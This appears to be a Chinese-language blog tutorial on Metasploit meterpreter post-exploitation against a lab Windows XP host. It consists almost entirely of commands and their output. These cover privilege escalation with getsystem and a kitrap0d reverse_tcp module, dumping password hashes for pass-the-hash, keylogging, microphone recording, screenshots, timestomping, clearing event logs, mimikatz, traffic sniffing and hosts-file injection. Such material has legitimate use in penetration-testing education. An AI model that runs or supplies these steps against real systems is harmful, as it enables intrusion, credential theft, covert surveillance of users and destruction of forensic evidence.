​                     

[TOC]



------

# 前言

获取meterpreter权限后，使用后渗透命令完成目的操作（超详细）

------

# 一、基本后渗透命令

> 获取meterpreter可以使用的命令，用来控制目标主机

## 1.帮助菜单

```ruby
meterpreter > help

Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for background
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
    close                     Closes a channel
    detach                    Detach the meterpreter session (for http/https)
    disable_unicode_encoding  Disables encoding of unicode strings
    enable_unicode_encoding   Enables encoding of unicode strings
    exit                      Terminate the meterpreter session
    get_timeouts              Get the current session timeout values
    guid                      Get the session GUID
    help                      Help menu
    info                      Displays information about a Post module
    irb                       Open an interactive Ruby shell on the current session
    load                      Load one or more meterpreter extensions
    machine_id                Get the MSF ID of the machine attached to the session
    migrate                   Migrate the server to another process
    pivot                     Manage pivot listeners
    pry                       Open the Pry debugger on the current session
    quit                      Terminate the meterpreter session
    read                      Reads data from a channel
    resource                  Run the commands stored in a file
    run                       Executes a meterpreter script or Post module
    secure                    (Re)Negotiate TLV packet encryption on the session
    sessions                  Quickly switch to another session
    set_timeouts              Set the current session timeout values
    sleep                     Force Meterpreter to go quiet, then re-establish session
    ssl_verify                Modify the SSL certificate verification setting
    transport                 Manage the transport mechanisms
    use                       Deprecated alias for "load"
    uuid                      Get the UUID for the current session
    write                     Writes data to a channel
	....
12345678910111213141516171819202122232425262728293031323334353637383940414243
```

## 2.后台命令

```ruby
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(windows/smb/ms08_067_netapi) > sessions 1
[*] Starting interaction with 1...

meterpreter > 
123456
```

## 3.机器ID和[UUID](https://so.csdn.net/so/search?q=UUID&spm=1001.2101.3001.7020)命令

```ruby
meterpreter > machine_id
[+] Machine ID: 4d149cd26b0b1aa2ffe1e0ef588e7937
meterpreter > uuid
[+] UUID: 93d31dae47310006/x86=1/windows=1/2021-05-13T14:01:48Z
meterpreter > 
12345
```

## 4.通信[信道](https://so.csdn.net/so/search?q=信道&spm=1001.2101.3001.7020)

```ruby
meterpreter > channel -l
No active channels.
meterpreter > 
123
```

如果有通信通道，则使用channel -r id选择读取数据的通道

## 5.获取用户和进程信息

```ruby
meterpreter > machine_id
[+] Machine ID: 4d149cd26b0b1aa2ffe1e0ef588e7937
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > getpid
Current pid: 1152
meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System             x86   0        NT AUTHORITY\SYSTEM
 128   736   svchost.exe        x86   0        NT AUTHORITY\LOCAL SERVICE    C:\WINDOWS\system32\svchost.exe
 248   736   metsvc.exe         x86   0        NT AUTHORITY\SYSTEM           C:\WINDOWS\TEMP\MWPrEozxdnwJwU\metsvc.exe
 504   736   VGAuthService.exe  x86   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe
 552   4     smss.exe           x86   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 612   552   csrss.exe          x86   0        NT AUTHORITY\SYSTEM           \??\C:\WINDOWS\system32\csrss.exe
 624   736   vmtoolsd.exe       x86   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 692   552   winlogon.exe       x86   0        NT AUTHORITY\SYSTEM           \??\C:\WINDOWS\system32\winlogon.exe
 736   692   services.exe       x86   0        NT AUTHORITY\SYSTEM           C:\WINDOWS\system32\services.exe
 748   692   lsass.exe          x86   0        NT AUTHORITY\SYSTEM           C:\WINDOWS\system32\lsass.exe
 928   736   vmacthlp.exe       x86   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\vmacthlp.exe
 944   736   svchost.exe        x86   0        NT AUTHORITY\SYSTEM           C:\WINDOWS\system32\svchost.exe
 1008  736   svchost.exe        x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\svchost.exe
 1064  1744  cmd.exe            x86   0        WINXP-1\st21                  C:\WINDOWS\system32\cmd.exe
 1152  736   svchost.exe        x86   0        NT AUTHORITY\SYSTEM           C:\WINDOWS\System32\svchost.exe
 1204  1064  conime.exe         x86   0        WINXP-1\st21                  C:\WINDOWS\system32\conime.exe
 1260  736   svchost.exe        x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\svchost.exe
 1364  736   svchost.exe        x86   0        NT AUTHORITY\LOCAL SERVICE    C:\WINDOWS\system32\svchost.exe
 1472  736   spoolsv.exe        x86   0        NT AUTHORITY\SYSTEM           C:\WINDOWS\system32\spoolsv.exe
 1744  1728  explorer.exe       x86   0        WINXP-1\st21                  C:\WINDOWS\Explorer.EXE
 1800  944   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
 1832  1152  wscntfy.exe        x86   0        WINXP-1\st21                  C:\WINDOWS\system32\wscntfy.exe
 1940  1744  rundll32.exe       x86   0        WINXP-1\st21                  C:\WINDOWS\system32\rundll32.exe
 1948  1744  vmtoolsd.exe       x86   0        WINXP-1\st21                  C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 1964  1744  ctfmon.exe         x86   0        WINXP-1\st21                  C:\WINDOWS\system32\ctfmon.exe
 1976  736   alg.exe            x86   0        NT AUTHORITY\LOCAL SERVICE    C:\WINDOWS\System32\alg.exe
 2164  944   wmiprvse.exe       x86   0        NT AUTHORITY\SYSTEM           C:\WINDOWS\system32\wbem\wmiprvse.exe
 2572  736   svchost.exe        x86   0        NT AUTHORITY\SYSTEM           C:\WINDOWS\System32\svchost.exe

meterpreter > migrate 1744
[*] Migrating from 1152 to 1744...
[*] Migration completed successfully.
meterpreter > 
1234567891011121314151617181920212223242526272829303132333435363738394041424344454647
```

查看进程号后可以使用migrate转移到安全的进程

## 6.获取系统信息

```ruby
meterpreter > sysinfo
Computer        : WINXP-1
OS              : Windows XP (5.1 Build 2600, Service Pack 3).
Architecture    : x86
System Language : zh_CN
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > 
123456789
```

## 7.网络命令

### ①查看本机ip和与网卡有关信息

```ruby
meterpreter > ifconfig

Interface  1
============
Name         : MS TCP Loopback interface
Hardware MAC : 00:00:00:00:00:00
MTU          : 1520
IPv4 Address : 127.0.0.1


Interface  2
============
Name         : AMD PCNET Family PCI Ethernet Adapter - rface
Hardware MAC : 00:0c:29:95:e3:e3
MTU          : 1500
IPv4 Address : 192.168.1.115
IPv4 Netmask : 255.255.255.0


Interface 65540
============
Name         : Bluetooth ▒�
Hardware MAC : 94:b8:6d:d2:53:f2
MTU          : 1500

meterpreter > 
1234567891011121314151617181920212223242526
```

### ②显示所有被渗透主机建立过的ip

```ruby
meterpreter > arp

ARP cache
=========

    IP address     MAC address        Interface
    ----------     -----------        ---------
    192.168.1.1    94:d9:b3:12:6f:c0  2
    192.168.1.113  00:0c:29:23:e3:cd  2

meterpreter > 
1234567891011
```

### ③显示主机运行的端口程序

```ruby
meterpreter > netstat

Connection list
===============

    Proto  Local address       Remote address      State        User  Inode  PID/Program name
    -----  -------------       --------------      -----        ----  -----  ----------------
    tcp    0.0.0.0:135         0.0.0.0:*           LISTEN       0     0      1008/svchost.exe
    tcp    0.0.0.0:445         0.0.0.0:*           LISTEN       0     0      4/System
    tcp    0.0.0.0:2869        0.0.0.0:*           LISTEN       0     0      1364/svchost.exe
    tcp    0.0.0.0:3389        0.0.0.0:*           LISTEN       0     0      944/svchost.exe
    tcp    0.0.0.0:31337       0.0.0.0:*           LISTEN       0     0      248/metsvc.exe
    tcp    127.0.0.1:1029      0.0.0.0:*           LISTEN       0     0      1976/alg.exe
    tcp    192.168.1.115:139   0.0.0.0:*           LISTEN       0     0      4/System
    tcp    192.168.1.115:1046  192.168.1.113:4444  ESTABLISHED  0     0      1152/svchost.exe
    udp    0.0.0.0:500         0.0.0.0:*                        0     0      748/lsass.exe
    udp    0.0.0.0:4500        0.0.0.0:*                        0     0      748/lsass.exe
    udp    0.0.0.0:445         0.0.0.0:*                        0     0      4/System
    udp    0.0.0.0:1025        0.0.0.0:*                        0     0      1260/svchost.exe
    udp    127.0.0.1:1035      0.0.0.0:*                        0     0      1152/svchost.exe
    udp    127.0.0.1:1900      0.0.0.0:*                        0     0      1364/svchost.exe
    udp    127.0.0.1:123       0.0.0.0:*                        0     0      1152/svchost.exe
    udp    192.168.1.115:123   0.0.0.0:*                        0     0      1152/svchost.exe
    udp    192.168.1.115:1900  0.0.0.0:*                        0     0      1364/svchost.exe
    udp    192.168.1.115:138   0.0.0.0:*                        0     0      4/System
    udp    192.168.1.115:137   0.0.0.0:*                        0     0      4/System

meterpreter > 
12345678910111213141516171819202122232425262728
```

## 8.文件操作命令

### ①查看当前工作目录

```ruby
meterpreter > pwd
C:\Documents and Settings\st21
12
```

### ②浏览目标文件夹，创建文件夹

```ruby
meterpreter > cd /
meterpreter > ls
Listing: C:\
============

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
100777/rwxrwxrwx  0       fil   2021-03-23 21:15:23 +0800  AUTOEXEC.BAT
100666/rw-rw-rw-  0       fil   2021-03-23 21:15:23 +0800  CONFIG.SYS
40777/rwxrwxrwx   0       dir   2021-03-23 21:07:28 +0800  Documents and Settings
100444/r--r--r--  0       fil   2021-03-23 21:15:23 +0800  IO.SYS
100444/r--r--r--  0       fil   2021-03-23 21:15:23 +0800  MSDOS.SYS
100555/r-xr-xr-x  47564   fil   2008-04-14 20:00:00 +0800  NTDETECT.COM
40555/r-xr-xr-x   0       dir   2021-03-23 21:08:30 +0800  Program Files
40777/rwxrwxrwx   0       dir   2021-04-14 10:26:18 +0800  RECYCLER
40777/rwxrwxrwx   0       dir   2021-03-23 21:07:28 +0800  System Volume Information
40777/rwxrwxrwx   0       dir   2021-03-24 05:05:15 +0800  WINDOWS
100666/rw-rw-rw-  211     fil   2021-03-24 05:07:04 +0800  boot.ini
100444/r--r--r--  322730  fil   2008-04-14 20:00:00 +0800  bootfont.bin
100444/r--r--r--  257728  fil   2008-04-14 20:00:00 +0800  ntldr
0000/---------    0       fif   1970-01-01 08:00:00 +0800  pagefile.sys
40777/rwxrwxrwx   0       dir   2021-04-13 17:30:50 +0800  phpStudy

meterpreter > mkdir tianxiu
Creating directory: tianxiu
meterpreter > ls
Listing: C:\
============

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
100777/rwxrwxrwx  0       fil   2021-03-23 21:15:23 +0800  AUTOEXEC.BAT
100666/rw-rw-rw-  0       fil   2021-03-23 21:15:23 +0800  CONFIG.SYS
40777/rwxrwxrwx   0       dir   2021-03-23 21:07:28 +0800  Documents and Settings
100444/r--r--r--  0       fil   2021-03-23 21:15:23 +0800  IO.SYS
100444/r--r--r--  0       fil   2021-03-23 21:15:23 +0800  MSDOS.SYS
100555/r-xr-xr-x  47564   fil   2008-04-14 20:00:00 +0800  NTDETECT.COM
40555/r-xr-xr-x   0       dir   2021-03-23 21:08:30 +0800  Program Files
40777/rwxrwxrwx   0       dir   2021-04-14 10:26:18 +0800  RECYCLER
40777/rwxrwxrwx   0       dir   2021-03-23 21:07:28 +0800  System Volume Information
40777/rwxrwxrwx   0       dir   2021-03-24 05:05:15 +0800  WINDOWS
100666/rw-rw-rw-  211     fil   2021-03-24 05:07:04 +0800  boot.ini
100444/r--r--r--  322730  fil   2008-04-14 20:00:00 +0800  bootfont.bin
100444/r--r--r--  257728  fil   2008-04-14 20:00:00 +0800  ntldr
0000/---------    0       fif   1970-01-01 08:00:00 +0800  pagefile.sys
40777/rwxrwxrwx   0       dir   2021-04-13 17:30:50 +0800  phpStudy
40777/rwxrwxrwx   0       dir   2021-05-14 08:46:28 +0800  tianxiu
meterpreter > 
123456789101112131415161718192021222324252627282930313233343536373839404142434445464748
```

### ③将文件上传到目标系统

```ruby
meterpreter > upload /initrd.img C:\\
[*] uploading  : /initrd.img -> C:\
[*] uploaded   : /initrd.img -> C:\\initrd.img
meterpreter > ls
Listing: C:\
============

Mode              Size      Type  Last modified              Name
----              ----      ----  -------------              ----
100777/rwxrwxrwx  0         fil   2021-03-23 21:15:23 +0800  AUTOEXEC.BAT
100666/rw-rw-rw-  0         fil   2021-03-23 21:15:23 +0800  CONFIG.SYS
40777/rwxrwxrwx   0         dir   2021-03-23 21:07:28 +0800  Documents and Settings
100444/r--r--r--  0         fil   2021-03-23 21:15:23 +0800  IO.SYS
100444/r--r--r--  0         fil   2021-03-23 21:15:23 +0800  MSDOS.SYS
100555/r-xr-xr-x  47564     fil   2008-04-14 20:00:00 +0800  NTDETECT.COM
40555/r-xr-xr-x   0         dir   2021-03-23 21:08:30 +0800  Program Files
40777/rwxrwxrwx   0         dir   2021-04-14 10:26:18 +0800  RECYCLER
40777/rwxrwxrwx   0         dir   2021-03-23 21:07:28 +0800  System Volume Information
40777/rwxrwxrwx   0         dir   2021-03-24 05:05:15 +0800  WINDOWS
100666/rw-rw-rw-  211       fil   2021-03-24 05:07:04 +0800  boot.ini
100444/r--r--r--  322730    fil   2008-04-14 20:00:00 +0800  bootfont.bin
100666/rw-rw-rw-  66816735  fil   2021-05-14 08:51:09 +0800  initrd.img
100444/r--r--r--  257728    fil   2008-04-14 20:00:00 +0800  ntldr
0000/---------    0         fif   1970-01-01 08:00:00 +0800  pagefile.sys
40777/rwxrwxrwx   0         dir   2021-04-13 17:30:50 +0800  phpStudy
40777/rwxrwxrwx   0         dir   2021-05-14 08:46:28 +0800  tianxiu

meterpreter > 
12345678910111213141516171819202122232425262728
```

### ④编辑和查看文件

```ruby
meterpreter > cat boot.ini
[boot loader]
timeout=30
default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS
[operating systems]
multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /noexecute=optin /fastdetect
meterpreter > edit boot.ini
1234567
```

### ⑤删除命令

```ruby
meterpreter > rmdir tianxiu
Removing directory: tianxiu
meterpreter > rm initrd.img
meterpreter > ls
Listing: C:\
============

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
100777/rwxrwxrwx  0       fil   2021-03-23 21:15:23 +0800  AUTOEXEC.BAT
100666/rw-rw-rw-  0       fil   2021-03-23 21:15:23 +0800  CONFIG.SYS
40777/rwxrwxrwx   0       dir   2021-03-23 21:07:28 +0800  Documents and Settings
100444/r--r--r--  0       fil   2021-03-23 21:15:23 +0800  IO.SYS
100444/r--r--r--  0       fil   2021-03-23 21:15:23 +0800  MSDOS.SYS
100555/r-xr-xr-x  47564   fil   2008-04-14 20:00:00 +0800  NTDETECT.COM
40555/r-xr-xr-x   0       dir   2021-03-23 21:08:30 +0800  Program Files
40777/rwxrwxrwx   0       dir   2021-04-14 10:26:18 +0800  RECYCLER
40777/rwxrwxrwx   0       dir   2021-03-23 21:07:28 +0800  System Volume Information
40777/rwxrwxrwx   0       dir   2021-03-24 05:05:15 +0800  WINDOWS
100666/rw-rw-rw-  211     fil   2021-03-24 05:07:04 +0800  boot.ini
100444/r--r--r--  322730  fil   2008-04-14 20:00:00 +0800  bootfont.bin
100444/r--r--r--  257728  fil   2008-04-14 20:00:00 +0800  ntldr
0000/---------    0       fif   1970-01-01 08:00:00 +0800  pagefile.sys
40777/rwxrwxrwx   0       dir   2021-04-13 17:30:50 +0800  phpStudy

meterpreter > 
1234567891011121314151617181920212223242526
```

## 9.桌面命令

```ruby
meterpreter > enumdesktops
Enumerating all accessible desktops

Desktops
========

    Session  Station   Name
    -------  -------   ----
    0        WinSta0   Default
    0        WinSta0   Disconnect
    0        WinSta0   Winlogon
    0        SAWinSta  SADesktop

meterpreter > getdesktop
Session 0\W\D
123456789101112131415
```

## 10.截图和摄像头

### ①截图

```ruby
meterpreter > screenshot
Screenshot saved to: /root/oghHHKCS.jpeg
12
```

### ②摄像头

```ruby
meterpreter > webcam_list
[-] No webcams were found
12
```

> 如果有摄像头可是使用webcam_stream进行录像，webcam_snap进行拍照

### ③环境监听

```ruby
meterpreter > record_mic
[*] Starting...
[*] Stopped
Audio saved to: /root/VoIacnzj.wav
meterpreter > record_mic -d 60
[*] Starting...
123456
```

> -d 指的是录音的秒数

### ④计算系统闲置时间

```ruby
meterpreter > idletime
User has been idle for: 13 mins 16 secs
meterpreter > 
123
```

### ⑤获取键盘记录

```ruby
meterpreter > keyscan_start
Starting the keystroke sniffer ...
meterpreter > keyscan_dump
Dumping captured keystrokes...
sqwwqeqwewqwqrrq<CR>
<Left Windows><CR>
ip<^H>f<^H>pconfig<CR>
1234567
```

# 二、高级后渗透命令

## 1.迁移进程

```ruby
meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System             x86   0        NT AUTHORITY\SYSTEM
 240   736   VGAuthService.exe  x86   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe
 408   736   vmtoolsd.exe       x86   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 544   4     smss.exe           x86   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 612   544   csrss.exe          x86   0        NT AUTHORITY\SYSTEM           \??\C:\WINDOWS\system32\csrss.exe
 692   544   winlogon.exe       x86   0        NT AUTHORITY\SYSTEM           \??\C:\WINDOWS\system32\winlogon.exe
 736   692   services.exe       x86   0        NT AUTHORITY\SYSTEM           C:\WINDOWS\system32\services.exe
 748   692   lsass.exe          x86   0        NT AUTHORITY\SYSTEM           C:\WINDOWS\system32\lsass.exe
 920   736   vmacthlp.exe       x86   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\vmacthlp.exe
 936   736   svchost.exe        x86   0        NT AUTHORITY\SYSTEM           C:\WINDOWS\system32\svchost.exe
 1004  736   svchost.exe        x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\svchost.exe
 1140  1148  wscntfy.exe        x86   0        WINXP-1\st21                  C:\WINDOWS\system32\wscntfy.exe
 1148  736   svchost.exe        x86   0        NT AUTHORITY\SYSTEM           C:\WINDOWS\System32\svchost.exe
 1172  736   alg.exe            x86   0        NT AUTHORITY\LOCAL SERVICE    C:\WINDOWS\System32\alg.exe
 1200  936   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
 1256  736   svchost.exe        x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\svchost.exe
 1292  1804  cmd.exe            x86   0        WINXP-1\st21                  C:\WINDOWS\system32\cmd.exe
 1304  736   svchost.exe        x86   0        NT AUTHORITY\SYSTEM           C:\WINDOWS\System32\svchost.exe
 1328  736   svchost.exe        x86   0        NT AUTHORITY\LOCAL SERVICE    C:\WINDOWS\system32\svchost.exe
 1348  1292  conime.exe         x86   0        WINXP-1\st21                  C:\WINDOWS\system32\conime.exe
 1504  736   spoolsv.exe        x86   0        NT AUTHORITY\SYSTEM           C:\WINDOWS\system32\spoolsv.exe
 1804  1736  explorer.exe       x86   0        WINXP-1\st21                  C:\WINDOWS\Explorer.EXE
 1840  736   svchost.exe        x86   0        NT AUTHORITY\LOCAL SERVICE    C:\WINDOWS\system32\svchost.exe
 1860  1804  rundll32.exe       x86   0        WINXP-1\st21                  C:\WINDOWS\system32\rundll32.exe
 1932  736   metsvc.exe         x86   0        NT AUTHORITY\SYSTEM           C:\WINDOWS\TEMP\MWPrEozxdnwJwU\metsvc.exe
 1964  1804  ctfmon.exe         x86   0        WINXP-1\st21                  C:\WINDOWS\system32\ctfmon.exe
 1976  1804  vmtoolsd.exe       x86   0        WINXP-1\st21                  C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 2420  1148  wuauclt.exe        x86   0        NT AUTHORITY\SYSTEM           C:\WINDOWS\system32\wuauclt.exe

meterpreter > migrate 1804
[*] Migrating from 1148 to 1804...
[*] Migration completed successfully.
12345678910111213141516171819202122232425262728293031323334353637383940
```

## 2.获取系统级管理

```ruby
meterpreter > getuid
Server username: WINXP-1\st21
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : WINXP-1
OS              : Windows XP (5.1 Build 2600, Service Pack 3).
Architecture    : x86
System Language : zh_CN
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > 
123456789101112131415
```

## 获取密码的哈希值

```ruby
meterpreter > run hashdump

[!] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.
[!] Example: run post/windows/gather/smart_hashdump OPTION=value [...]
[*] Obtaining the boot key...
[*] Calculating the hboot key using SYSKEY a6cc07586ea276fb6bb10b5e6fbc07e1...
[*] Obtaining the user list and keys...
[*] Decrypting user keys...
[*] Dumping password hints...

No users with password hints on this system

[*] Dumping password hashes...


Administrator:500:03c37180a9ea4576aad3b435b51404ee:23d62863d5cc7859324255e907b6e001:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c3:::
HelpAssistant:1000:fe34c385120549d6750e2ee2dfc84311:1f14f496bdc58c488069e05d18e7e581:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:c2a7d9b98946cb36f00513e2db1a4834:::
st21:1003:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c9:::
1234567891011121314151617181920
```

> 获得哈希值后就可以进行pass-the-hash攻击

## 4.修改文件的访问修改创建时间

```ruby
meterpreter > timestomp -v boot.ini
[*] Showing MACE attributes for boot.ini
Modified      : 2021-03-23 21:12:04 +0800
Accessed      : 2021-05-14 08:58:58 +0800
Created       : 2021-03-24 05:07:04 +0800
Entry Modified: 2021-03-23 21:15:38 +0800
meterpreter > timestomp -z "1/1/1000 1:1:1" boot.ini
[*] Setting specific MACE attributes on boot.ini
meterpreter > timestomp -v boot.ini
[*] Showing MACE attributes for boot.ini
Modified      : 2088-10-25 04:41:26 +0800
Accessed      : 2088-10-25 04:41:26 +0800
Created       : 2088-10-25 04:41:26 +0800
Entry Modified: 2088-10-25 04:41:26 +0800
meterpreter > timestomp -b boot.ini
[*] Blanking file MACE attributes on boot.ini
meterpreter > timestomp -v boot.ini
[*] Showing MACE attributes for boot.ini
Modified      : 2088-10-25 04:41:26 +0800
Accessed      : 2088-10-25 04:41:26 +0800
Created       : 2088-10-25 04:41:26 +0800
Entry Modified: 2088-10-25 04:41:26 +0800
12345678910111213141516171819202122
```

> -v查看时间信息，-z修改，-b清空

# 三、其他后渗透模块

> 以下所有操作均为metasploit模块实现

## 1.收集无线ssid信息

```ruby
meterpreter > run post/windows/wlan/wlan_bss_list

[*] WlanAPI Handle Closed Successfully
123
```

## 2.收集wifi密码

```ruby
meterpreter > run post/windows/wlan/wlan_profile

[*] No wireless interfaces
123
```

## 3.获取应用程序列表

```ruby
meterpreter > run post/windows/wlan/wlan_profile

[*] No wireless interfaces
meterpreter > run get_application_list

[!] Meterpreter scripts are deprecated. Try post/windows/gather/enum_applications.
[!] Example: run post/windows/gather/enum_applications OPTION=value [...]

Installed Applications
======================

 Name  Version
 ----  -------
 
1234567891011121314
```

## 4.获取Skype密码

```ruby
meterpreter > run post/windows/gather/credentials/skype

[*] Checking for encrypted salt in the registry
[+] Salt found and decrypted
1234
```

## 5.use使用历史

```ruby
meterpreter > run post/windows/gather/usb_history

[*] Running module against WINXP-1
[*] 
   D:   IDE#CdRomNECVMWar_VMware_IDE_CDR10_______________1.00____#3031303030303030303030303030303030303130#{53f5630d-b6bf-11d0-94f2-00a0c91efb1b}
   C:                                                                Disk 28722871 

[-] No USB devices appear to have been connected to this host.
meterpreter > 
123456789
```

## 6.查找文件

```ruby
meterpreter > search -f boot.ini
Found 1 result...
    c:\boot.ini (211 bytes)
meterpreter > 
1234
```

## 7.清除系统日志

```ruby
meterpreter > clearev
[*] Wiping 643 records from Application...
[*] Wiping 519 records from System...
[-] stdapi_sys_eventlog_open: Operation failed: 1314
meterpreter > run event_manager -i
[*] Retriving Event Log Configuration

Event Logs on System
====================

 Name                   Retention  Maximum Size  Records
 ----                   ---------  ------------  -------
 Application            Disabled   524288K       0
 Security               Disabled   524288K       Access Denied
 System                 Disabled   524288K       0
 ThinPrint Diagnostics  Disabled   K             0

meterpreter > 
123456789101112131415161718
```

> clearev清除日志，run event_manager -i查看日志

# 四、Metasploit中的高级扩展功能

## 1.提升权限

使用metasploit自带的后渗透模块，将控制权限提到最高级别

```ruby
msf6 exploit(windows/local/ms10_015_kitrap0d) > options

Module options (exploit/windows/local/ms10_015_kitrap0d):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.1.113    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 2K SP4 - Windows 7 (x86)

msf6 exploit(windows/local/ms10_015_kitrap0d) > set session 1
session => 1
msf6 exploit(windows/local/ms10_015_kitrap0d) > exploit
123456789101112131415161718192021222324252627
```

## 2.查找明文密码

> 使用这个命令，首先需要load mimikatz

```ruby
meterpreter > kerberos
1
```

## 3.进行流量嗅探

```ruby
meterpreter > sniffer_interfaces
meterpreter > sniffer_start 2 1000
meterpreter > sniffer_dump
meterpreter > sniffer_dump 2 fir.pcap
1234
```

使用wireshark fir.pcap打开查看

```ruby
┌──(root💀kali)-[~]
└─# wireshark fir.pcap
12
```

## 4.对host文件进行注入

```ruby
msf6 exploit(windows/local/ms10_015_kitrap0d) > use post/windows/manage/inject_host
msf6 post(windows/manage/inject_host) > options

Module options (post/windows/manage/inject_host):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   DOMAIN                    yes       Domain name for host file manipulation.
   IP                        yes       IP address to point domain name to.
   SESSION                   yes       The session to run this module on.

msf6 post(windows/manage/inject_host) > set session 1
session => 1
msf6 post(windows/manage/inject_host) > set ip 192.168.1.113
ip => 192.168.1.113d
msf6 post(windows/manage/inject_host) > set domain www.tianxiu.com
domain => www.tianxiu.com
msf6 post(windows/manage/inject_host) > exploit

[*] Inserting hosts file entry pointing www.tianxiu.com to 192.168.1.113..
[+] Done!
[*] Post module execution completed
msf6 post(windows/manage/inject_host) > 
1234567891011121314151617181920212223
```

查看winxp的hosts文件，已经成功注入
